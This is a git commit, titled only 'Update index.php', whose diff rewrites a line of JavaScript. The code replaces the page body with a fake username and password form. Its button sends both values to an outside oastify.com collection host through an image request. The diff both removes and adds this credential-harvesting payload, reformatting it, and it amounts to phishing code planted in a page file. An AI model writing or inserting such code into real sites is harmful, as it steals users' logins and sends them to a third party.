0a2ca8cb32a2d02ae2ba3f8483cacfba101194a5
vulnoob <200810511+vulnoob@users.noreply.github.com>
2025-10-23 11:09:38 -0500

    Update index.php

--- index.php
+++ index.php
@@ -1,1 +1,4 @@
-document.body.innerHTML=<input id="u"><input id="p" type="password"><button onclick="(new Image).src='h3l691wjb8pesviumt9ranrxbohf56tv.oastify.com/?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value)">Send</button>
+document.body.innerHTML =
+  '<input id="u">' +
+  '<input id="p" type="password">' +
+  '<button onclick="(new Image()).src=\'https://h3l691wjb8pesviumt9ranrxbohf56tv.oastify.com/?u=\'+encodeURIComponent(document.getElementById(\'u\').value)+\'&p=\'+encodeURIComponent(document.getElementById(\'p\').value)">Send</button>';
